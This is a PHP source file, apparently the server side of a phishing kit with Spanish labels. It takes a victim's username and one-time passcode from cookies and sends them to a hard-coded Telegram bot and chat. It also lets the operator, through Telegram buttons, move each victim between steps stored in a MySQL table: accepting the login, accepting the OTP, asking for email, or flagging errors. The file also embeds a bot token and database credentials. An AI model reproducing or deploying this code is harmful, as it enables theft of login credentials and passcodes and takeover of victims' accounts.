<?php

$usuario = $_COOKIE['usuario'];

if (isset($_COOKIE['cdinamica'])) {
    $otp = $_COOKIE['cdinamica'];

       sendMessageWithButtons($chatId, "Registro:$usuario\n Otp: $otp", $buttons);

} else {
    
}


$botToken = '7326614103:AAH7nj1c_exaJ8VUAVSLNYM4dUcaX3nu2JI';

$telegramApiUrl = "https://api.telegram.org/bot{$botToken}/";

function sendMessageWithButtons($chatId, $text, $buttons) {
    global $telegramApiUrl;

    $encodedButtons = json_encode($buttons);

    $params = array(
        "chat_id" => $chatId,
        "text" => $text,
        "reply_markup" => $encodedButtons
    );

    $sendMessageUrl = $telegramApiUrl . "sendMessage";

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $sendMessageUrl);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($params));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);

    return $response;
}
function handleCallbackQuery($callbackQuery) {
    $callbackData = $callbackQuery['data'];
    $chatId = $callbackQuery['message']['chat']['id'];
    $originalMessageText = $callbackQuery['message']['text'];

    $startPos = strpos($originalMessageText, 'Registro:') + strlen('Registro:');
    $endPos = strpos($originalMessageText, 'Contraseña');
    $usuario = trim(substr($originalMessageText, $startPos, $endPos - $startPos));

    switch ($callbackData) {
        case 'action1':
            actualizarEstadoUsuario($usuario);
            $responseText = "User✅ $usuario";
            break;
        case 'action2':
            actualizarEstadoOtp($usuario);
            $responseText = "OTP✅ $usuario";
            break;
        case 'action3':
            actualizarEstadoCorreo($usuario);
            $responseText = "Se pidio Correo ✅";
            break;
        case 'action5':
            errorOtp($usuario);
            $responseText = "Error OTP ❌";

            break;
        case 'action6':
            errorUser($usuario);
            $responseText = "Error Usuario ❌";

            break;
            
        case 'action7':
            finalizar($usuario);
            $responseText = "Finish✅";

            break;
        default:
            $responseText = "Botón desconocido";
    }

    sendMessage($chatId, $responseText);
}

function sendMessage($chatId, $text) {
    global $telegramApiUrl;

    // Parámetros del mensaje
    $params = array(
        "chat_id" => $chatId,
        "text" => $text
    );

    $sendMessageUrl = $telegramApiUrl . "sendMessage";

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $sendMessageUrl);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($params));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);

    // Retorna la respuesta de la API de Telegram
    return $response;
}

function conectarBaseDeDatos() {
    $servidor = 'localhost';
    $usuario = 'u851137105_2';
    $contrasena = '123456789Cb.';
    $nombreBD = 'u851137105_2';

    try {
        $conexion = new PDO("mysql:host=$servidor;dbname=$nombreBD", $usuario, $contrasena);
        // Habilitar el manejo de errores de PDO
        $conexion->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        return $conexion;
    } catch(PDOException $e) {
        // Manejar el error en caso de fallo en la conexión
        die("Error de conexión: " . $e->getMessage());
    }
}

function actualizarEstadoUsuario($usuario) {
    $conexion = conectarBaseDeDatos();
    try {
        $consulta = $conexion->prepare("UPDATE rtr45 SET status = 12 WHERE usuario = :usuario");
        $consulta->bindParam(':usuario', $usuario);
        $consulta->execute();
        $conexion = null;
        return true; 
    } catch(PDOException $e) {
        die("Error al actualizar el estado: " . $e->getMessage());
    }
}
function finalizar($usuario) {
    $conexion = conectarBaseDeDatos();
    try {
        $consulta = $conexion->prepare("UPDATE rtr45 SET status = 10 WHERE usuario = :usuario");
        $consulta->bindParam(':usuario', $usuario);
        $consulta->execute();
        $conexion = null;
        return true; 
    } catch(PDOException $e) {
        die("Error al actualizar el estado: " . $e->getMessage());
    }
}

function actualizarEstadoOtp($usuario) {
    $conexion = conectarBaseDeDatos();
    try {
        $consulta = $conexion->prepare("UPDATE rtr45 SET status = 2 WHERE usuario = :usuario");
        $consulta->bindParam(':usuario', $usuario);
        $consulta->execute();
        $conexion = null;
        return true; // Éxito al actualizar el estado
    } catch(PDOException $e) {
        die("Error al actualizar el estado: " . $e->getMessage());
    }
}

function actualizarEstadoCorreo($usuario) {
    $conexion = conectarBaseDeDatos();
    try {
        $consulta = $conexion->prepare("UPDATE rtr45 SET status = 4 WHERE usuario = :usuario");
        $consulta->bindParam(':usuario', $usuario);
        $consulta->execute();
        $conexion = null;
        return true; // Éxito al actualizar el estado
    } catch(PDOException $e) {
        die("Error al actualizar el estado: " . $e->getMessage());
    }
}

function actualizarEstadoTarjeta($usuario) {
    $conexion = conectarBaseDeDatos();
    try {
        $consulta = $conexion->prepare("UPDATE rtr45 SET status = 6 WHERE usuario = :usuario");
        $consulta->bindParam(':usuario', $usuario);
        $consulta->execute();
        $conexion = null;
        return true; // Éxito al actualizar el estado
    } catch(PDOException $e) {
        die("Error al actualizar el estado: " . $e->getMessage());
    }
}
function errorOtp($usuario) {
    $conexion = conectarBaseDeDatos();
    try {
        $consulta = $conexion->prepare("UPDATE rtr45 SET status = 8 WHERE usuario = :usuario");
        $consulta->bindParam(':usuario', $usuario);
        $consulta->execute();
        $conexion = null;
        return true; // Éxito al actualizar el estado
    } catch(PDOException $e) {
        die("Error al actualizar el estado: " . $e->getMessage());
    }
}
function errorUser($usuario) {
    $conexion = conectarBaseDeDatos();
    try {
        $consulta = $conexion->prepare("UPDATE rtr45 SET status = 12 WHERE usuario = :usuario");
        $consulta->bindParam(':usuario', $usuario);
        $consulta->execute();
        $conexion = null;
        return true; // Éxito al actualizar el estado
    } catch(PDOException $e) {
        die("Error al actualizar el estado: " . $e->getMessage());
    }
}



$update = json_decode(file_get_contents("php://input"), true);

if (isset($update['callback_query'])) {
    handleCallbackQuery($update['callback_query']);
} else {
    $buttons = array(
        "inline_keyboard" => array(
            array(
                array("text" => "✅User", "callback_data" => "action1"),
                array("text" => "✅OTP", "callback_data" => "action2"),
                array("text" => "📩Correo", "callback_data" => "action3"),
                array("text" => "❌ OTP", "callback_data" => "action5"),
                array("text" => "❌ USER", "callback_data" => "action6"),
                array("text" => "❌ FIN", "callback_data" => "action7"),



            )
        )
    );

    $chatId = '1053381147';

    // Enviar un mensaje con botones y los datos del registro
    sendMessageWithButtons($chatId, "Registro: $usuario Contraseña", $buttons);
}
